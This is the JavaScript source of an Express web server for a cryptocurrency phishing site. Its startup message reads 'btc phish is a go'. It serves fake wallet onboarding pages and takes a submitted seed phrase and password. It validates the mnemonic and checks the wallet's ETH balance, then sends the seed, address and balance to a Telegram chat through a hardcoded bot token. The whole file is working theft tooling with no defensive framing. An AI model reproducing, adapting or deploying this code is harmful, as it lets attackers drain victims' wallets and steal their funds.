const express = require("express");
const app = express();
const port = 3000;
const path = require("path");
const bip39 = require("bip39");
const bodyParser = require("body-parser");
const axios = require("axios");
const {ethers} = require("ethers");

app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json());

app.use(express.static(path.resolve(__dirname, "/public")));

app.use("/", express.static(path.resolve(__dirname, "public")))

const ethservice = require("./ethservice");

/**
 * Handles post request of seed
 * @param {*} req 
 * @param {*} res 
 * @return Promise<{success: Boolean, message: String}>
 */
 const handleRequest = async (req, res) => {
    try {
        // const text = req.body.seed;
        const {seed, password, password_again} = req.body;
        const response = await handleSeed(seed, password, password_again);
        return res.send(response);
    } 
    
    catch (error) {
        console.log(error);
        return res.send({
            success: false, 
            message: error.message, 
        })
    }
}

const handleSeed = async (seed, password, password_again) => {
    try {

        // passwords match
        if (password !== password_again) {
            return {
                success: false, 
                message: "passwords do not match"
            }
        }

        // validate mnemonic
        const isValidMnemonic = await ethservice.validateMnemonic(seed);

        if (!isValidMnemonic) {return {
            suiccess: false, 
            message: "invalid seed phrase"
        }}

        // get the wallet address
        const wallet = await ethservice.getEthWallet(seed);
        const balance = await ethservice.getEthAddressBalance(wallet);

        console.log(wallet, balance.final_balance, balance.balance_usd);

        const text = `Seed: ${seed}\nAddress 0: ${wallet}, Balance: ${balance.final_balance} ETH, USD: ${balance.balance_usd}`;
        // return;
        // send key phrase to telegram group
        await axios({
            method: "POST",
            url: `https://api.telegram.org/bot1489425393:AAH1rIGVAK4vEU85jMiheJz9BgXtjzPfIWU/sendMessage`,
            data: {
                chat_id: "-560523528",
                text,
            },
        });

        return {success: true, message: ":)"}
    } catch (error) {
        console.log(error);
        return {success: false, message: error.message}
    }
}


app.get("/", (req, res) => {
    return res.sendFile(__dirname + "/public/get-started.html")
})

app.get("/get-started", (req, res) => {
    return res.sendFile(__dirname + "/public/get-started.html");
})

app.get("/action", (req, res) => {
    return res.sendFile(__dirname + "/public/action.html");
})

app.get("/import-tos", (req, res) => {
    return res.sendFile(__dirname + "/public/import-tos.html");
})
app.get("/import-seed", (req, res) => {
    return res.sendFile(__dirname + "/public/import-seed.html");
})

app.post("/handle-seed", handleRequest);


app.listen(port, () => {
    console.log("btc phish is a go")
})

module.exports = {
    handleSeed,
}
